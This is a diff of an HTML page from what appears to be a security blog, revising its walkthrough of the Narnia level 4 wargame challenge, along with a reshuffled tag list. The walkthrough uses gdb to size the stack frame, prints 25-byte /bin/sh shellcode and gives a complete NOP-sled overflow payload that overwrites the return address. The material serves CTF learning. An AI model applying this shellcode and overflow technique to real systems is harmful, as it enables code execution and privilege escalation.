@@ -787,16 +787,16 @@ int main<span class="o">(</span>int argc,char **argv<span class="o">){</span>
 <p>This binary does three things: first, it creates a buffer array of size 256, then it makes all of the system environment variables equal to zero, and then it copies whatever user input it had to the buffer.</p>
 <p>The reason why this code clears  the environment variables is to avoid the possibility of us placing a shellcode exploit to them  (like we did in the Level 2).</p>
 <h3>Step 2: Outlining the Attack</h3>
-<p>To exploit this binary we are going to overwrite our <strong>return address</strong> like in the level 2, but this time we can't use some variable to point it to our exploit. However, since our Stack us executable, we can place the shellcode in the Stack. The steps we follow are:</p>
+<p>To exploit this binary we are going to overwrite our <strong>return address</strong> like in  level 2, but this time we can't use an external address to point to. However, since our Stack is executable, we can place the shellcode in the Stack. The steps we follow are:</p>
 <ol>
-<li>Find out the size of the Stack. Only the return address won't matter there since we can't point it to anywhere outside the code.</li>
-<li>Create a shell code with the return address minus some value we define so that the return address points to somewhere inside the stack.</li>
-<li>Fill the beginning of the Stack with a lots of <a href="http://en.wikipedia.org/wiki/NOP">NOPs</a> (No Operations), which in the x86 CPU family is represented with <code>0x90</code>. If the pointer hits these places, it just keep advancing until it finds our shell.</li>
-<li>To make everything to fit right in the Stack frame, we pad the end of the shell code with junk.
+<li>Find out the size of the Stack.  Just having the return address won't help  since we can't point it to anywhere outside the code.</li>
+<li>Create a shellcode with the return address minus some value we define so that the return address points to somewhere inside the Stack.</li>
+<li>Fill the beginning of the Stack with a lots of <a href="http://en.wikipedia.org/wiki/NOP">NOPs</a> (No Operations), which in the x86 CPU family is represented with <code>0x90</code>. If the pointer hits these places, it just keeps advancing until it finds our shell.</li>
+<li>To make everything fit right in the Stack frame, we pad the end of the shell code with junk.
 .</li>
 </ol>
 <h3>Step 3: Getting the Frame Size</h3>
-<p>With gdb we can extract the relevant memory locations. Let's run our program with an input of the size of the buffer. Here we use the flag <code>-args</code> because otherwise we will get a complain that the name is too long:</p>
+<p>With gdb we can extract the relevant memory locations. Let's run our program with an input of the size of the buffer. Here we use the flag <code>--args</code> because otherwise we will get an error that the name is too long:</p>
 <div class="highlight"><pre>narnia4@melinda:/narnia<span class="nv">$ </span>gdb --args  narnia4 <span class="sb">`</span>python -c <span class="s2">&quot;print &#39;A&#39;*256&quot;</span><span class="sb">`</span>
 Reading symbols from /games/narnia/narnia4...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
 <span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel
@@ -829,7 +829,7 @@ Starting program: /games/narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 </pre></div>
 
 
-<p>Now, let's take a look where the frame, starts:</p>
+<p>We see that the frame starts at <strong>0xffffd4cc</strong>:</p>
 <div class="highlight"><pre><span class="o">(</span>gdb<span class="o">)</span> x/90xw <span class="nv">$esp</span>
 0xffffd4a0: 0xffffd4cc  0xffffd7be  0x00000021  0xf7ff7d54
 0xffffd4b0: 0xf7e2ae38  0x00000000  0x00000026  0xffffffff
@@ -857,7 +857,7 @@ Starting program: /games/narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 </pre></div>
 
 
-<p>Taking a look at the information of the frame, gives us the return address with the address <strong>0xffffd4cc</strong> from above, we find the size of the Stack:</p>
+<p>Taking a look at the information of the frame gives us the return address, from which we find the size of the Stack:</p>
 <div class="highlight"><pre><span class="o">(</span>gdb<span class="o">)</span> i f
 Stack level 0, frame at 0xffffd5e0:
  <span class="nv">eip</span> <span class="o">=</span> 0x80484fa in main; saved eip 0xf7e404b3
@@ -871,10 +871,9 @@ Stack level 0, frame at 0xffffd5e0:
 
 
 <h3>Step 4: Writing and Applying the Exploit</h3>
-<p>We know that the Stack has size of 272 bytes and that the return address is <strong>0xffffd5dc</strong>.  The stack plus the return address sum to 276.</p>
-<p>Now we have some freedoom to choose where to place our shellcode. Let's say, we place somewhere in the middle, say at the position 134. The position
-in the memory will be <code>0xffffd5cc - 134 = 0xffffd546</code>.</p>
-<p>Since 276 minus 134 is 142, if we give the return address the  address <strong>0xffffd546</strong>, it will go to the 142th position in the Stack and execute whatever is there. We want to make sure that the return address will always end in the shellcode address and for this reason we fill the addresses around with NOPs.</p>
+<p>We know that the Stack has size of 272 bytes and that the return address is <strong>0xffffd5dc</strong>.  If we add the return address, it sums to 276.</p>
+<p>Now we have some freedom to choose where to place our shellcode. Let's say, we place it somewhere in the middle, say, at the position 134. In the memory, we get: <code>0xffffd5cc - 134 = 0xffffd546</code>.</p>
+<p>Since 276 minus 134 is 142, if we point the return address to   <strong>0xffffd546</strong>, it will go to the 142th position in the Stack and execute whatever is there. We want to make sure that the return address will always end in the shellcode address and for this reason we fill the addresses around with NOPs.</p>
 <p>We will borrow the shellcode from the previous levels, which has size of 25 bytes:</p>
 <div class="highlight"><pre><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">xc0</span><span class="err">\</span><span class="n">x50</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x73</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x69</span><span class="err">\</span><span class="n">x6e</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe3</span><span class="err">\</span><span class="n">x50</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe2</span><span class="err">\</span><span class="n">x50</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe1</span><span class="err">\</span><span class="n">xb0</span><span class="err">\</span><span class="n">x0b</span><span class="err">\</span><span class="n">xcd</span><span class="err">\</span><span class="n">x80</span>
 </pre></div>
@@ -885,7 +884,7 @@ in the memory will be <code>0xffffd5cc - 134 = 0xffffd546</code>.</p>
 </pre></div>
 
 
-<p>We could have used another address to start our exploit too, and then we would just adjust our NOPs and our paddings. For example, <code>0xffffd5cc - 120 = 0xffffd554</code>:</p>
+<p>We could have used another address to craft another version of the exploit. Then we would have to simply adjust our NOPs and our paddings. For example, <code>0xffffd5cc - 120 = 0xffffd554</code>:</p>
 <div class="highlight"><pre><span class="err">`</span><span class="n">print</span> <span class="o">-</span><span class="n">c</span> <span class="s">&quot;&#39;</span><span class="se">\x90</span><span class="s">&#39;*156 + &#39;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">&#39; + &#39;A&#39;*91 + &#39;</span><span class="se">\x54\xd5\xff\xff</span><span class="s">&#39;&quot;</span> <span class="err">`</span>
 </pre></div>
 
@@ -964,28 +963,13 @@ in the memory will be <code>0xffffd5cc - 134 = 0xffffd546</code>.</p>
 <li class="nav-header"><h4>Tags</h4></li>
 <ul class="tagcloud">
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/jad.html">
-        <i class="icon-tag icon-large"></i>jad
-    </a>
-</li>
-<li class="tag-3">
-    <a href="http://bt3gl.github.io/tag/pdf-parser.html">
-        <i class="icon-tag icon-large"></i>pdf-parser
+    <a href="http://bt3gl.github.io/tag/gdb.html">
+        <i class="icon-tag icon-large"></i>gdb
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/bash.html">
-        <i class="icon-tag icon-large"></i>Bash
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/pdftotext.html">
-        <i class="icon-tag icon-large"></i>pdftotext
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/readelf.html">
-        <i class="icon-tag icon-large"></i>readelf
+    <a href="http://bt3gl.github.io/tag/shellshock.html">
+        <i class="icon-tag icon-large"></i>Shellshock
     </a>
 </li>
 <li class="tag-1">
@@ -994,48 +978,8 @@ in the memory will be <code>0xffffd5cc - 134 = 0xffffd546</code>.</p>
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/steganography.html">
-        <i class="icon-tag icon-large"></i>Steganography
-    </a>
-</li>
-<li class="tag-3">
-    <a href="http://bt3gl.github.io/tag/wireshark.html">
-        <i class="icon-tag icon-large"></i>Wireshark
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/hope.html">
-        <i class="icon-tag icon-large"></i>Hope
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/pygenere.html">
-        <i class="icon-tag icon-large"></i>pygenere
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/stack.html">
-        <i class="icon-tag icon-large"></i>Stack
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/chaosreader.html">
-        <i class="icon-tag icon-large"></i>Chaosreader
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/lamp.html">
-        <i class="icon-tag icon-large"></i>LAMP
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/shellshock.html">
-        <i class="icon-tag icon-large"></i>Shellshock
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/buffer.html">
-        <i class="icon-tag icon-large"></i>Buffer
+    <a href="http://bt3gl.github.io/tag/outguess.html">
+        <i class="icon-tag icon-large"></i>OutGuess
     </a>
 </li>
 <li class="tag-4">
@@ -1044,8 +988,48 @@ in the memory will be <code>0xffffd5cc - 134 = 0xffffd546</code>.</p>
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/nop.html">
-        <i class="icon-tag icon-large"></i>NOP
+    <a href="http://bt3gl.github.io/tag/stack.html">
+        <i class="icon-tag icon-large"></i>Stack
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/linux.html">
+        <i class="icon-tag icon-large"></i>Linux
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/mem.html">
+        <i class="icon-tag icon-large"></i>mem
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/overflow.html">
+        <i class="icon-tag icon-large"></i>Overflow
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/steganography.html">
+        <i class="icon-tag icon-large"></i>Steganography
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/ftp.html">
+        <i class="icon-tag icon-large"></i>FTP
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/vigenere.html">
+        <i class="icon-tag icon-large"></i>Vigenere
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/readelf.html">
+        <i class="icon-tag icon-large"></i>readelf
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/c.html">
+        <i class="icon-tag icon-large"></i>C
     </a>
 </li>
 <li class="tag-4">
@@ -1054,8 +1038,28 @@ in the memory will be <code>0xffffd5cc - 134 = 0xffffd546</code>.</p>
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/ftp.html">
-        <i class="icon-tag icon-large"></i>FTP
+    <a href="http://bt3gl.github.io/tag/uncompyle2.html">
+        <i class="icon-tag icon-large"></i>uncompyle2
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/chaosreader.html">
+        <i class="icon-tag icon-large"></i>Chaosreader
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/bash.html">
+        <i class="icon-tag icon-large"></i>Bash
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/command-injection.html">
+        <i class="icon-tag icon-large"></i>Command Injection
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/lamp.html">
+        <i class="icon-tag icon-large"></i>LAMP
     </a>
 </li>
 <li class="tag-4">
@@ -1069,48 +1073,18 @@ in the memory will be <code>0xffffd5cc - 134 = 0xffffd546</code>.</p>
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/socket.html">
-        <i class="icon-tag icon-large"></i>socket
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/gdb.html">
-        <i class="icon-tag icon-large"></i>gdb
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/overflow.html">
-        <i class="icon-tag icon-large"></i>Overflow
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/outguess.html">
-        <i class="icon-tag icon-large"></i>OutGuess
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/love.html">
-        <i class="icon-tag icon-large"></i>Love
-    </a>
-</li>
-<li class="tag-4">
     <a href="http://bt3gl.github.io/tag/assembly.html">
         <i class="icon-tag icon-large"></i>Assembly
     </a>
 </li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/command-injection.html">
-        <i class="icon-tag icon-large"></i>Command Injection
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/wireshark.html">
+        <i class="icon-tag icon-large"></i>Wireshark
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/vigenere.html">
-        <i class="icon-tag icon-large"></i>Vigenere
-    </a>
-</li>
-<li class="tag-1">
-    <a href="http://bt3gl.github.io/tag/ctf.html">
-        <i class="icon-tag icon-large"></i>CTF
+    <a href="http://bt3gl.github.io/tag/pygenere.html">
+        <i class="icon-tag icon-large"></i>pygenere
     </a>
 </li>
 <li class="tag-4">
@@ -1119,28 +1093,53 @@ in the memory will be <code>0xffffd5cc - 134 = 0xffffd546</code>.</p>
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/uncompyle2.html">
-        <i class="icon-tag icon-large"></i>uncompyle2
+    <a href="http://bt3gl.github.io/tag/jad.html">
+        <i class="icon-tag icon-large"></i>jad
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/linux.html">
-        <i class="icon-tag icon-large"></i>Linux
+    <a href="http://bt3gl.github.io/tag/love.html">
+        <i class="icon-tag icon-large"></i>Love
     </a>
 </li>
 <li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/c.html">
-        <i class="icon-tag icon-large"></i>C
+    <a href="http://bt3gl.github.io/tag/socket.html">
+        <i class="icon-tag icon-large"></i>socket
+    </a>
+</li>
+<li class="tag-1">
+    <a href="http://bt3gl.github.io/tag/ctf.html">
+        <i class="icon-tag icon-large"></i>CTF
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/pdftotext.html">
+        <i class="icon-tag icon-large"></i>pdftotext
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/hope.html">
+        <i class="icon-tag icon-large"></i>Hope
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/buffer.html">
+        <i class="icon-tag icon-large"></i>Buffer
+    </a>
+</li>
+<li class="tag-3">
+    <a href="http://bt3gl.github.io/tag/pdf-parser.html">
+        <i class="icon-tag icon-large"></i>pdf-parser
+    </a>
+</li>
+<li class="tag-4">
+    <a href="http://bt3gl.github.io/tag/nop.html">
+        <i class="icon-tag icon-large"></i>NOP
     </a>
 </li>
 <li class="tag-4">
     <a href="http://bt3gl.github.io/tag/rot13.html">
         <i class="icon-tag icon-large"></i>ROT13
-    </a>
-</li>
-<li class="tag-4">
-    <a href="http://bt3gl.github.io/tag/mem.html">
-        <i class="icon-tag icon-large"></i>mem
     </a>
 </li>
 
